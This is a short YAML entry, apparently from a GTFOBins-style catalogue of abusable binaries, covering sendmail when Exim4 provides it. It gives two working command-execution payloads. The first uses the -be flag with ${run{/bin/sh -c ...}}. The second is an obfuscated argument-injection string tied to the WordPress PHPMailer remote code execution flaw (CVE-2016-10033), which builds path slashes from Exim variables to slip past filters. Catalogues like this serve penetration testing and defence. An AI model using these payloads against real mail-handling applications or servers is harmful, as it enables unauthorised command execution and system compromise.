---
description: sendmail differs between systems, depending on whether it is postfix, exim, or otherwise, which provides the binary.
functions:
  command:
    - description: The -be flag can be used to execute system commands, when sendmail is provided by Exim4. 
      code: |
        sendmail -be '${run{/bin/sh -c "uname -a"}{yes}{no}}'
    - description: See [\"PoC HTTP request / minimal PoC exploit\"](https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html) for more information about this exploit.
      code: |
        sendmail -t -i -femail@address.com(tmp1 -be ${run{${substr{0}{1}{$spool_directory}}usr${substr{0}{1}{$spool_directory}}bin${substr{0}{1}{$spool_directory}}uname${substr{10}{1}{$tod_log}}-a$}} tmp2)

---
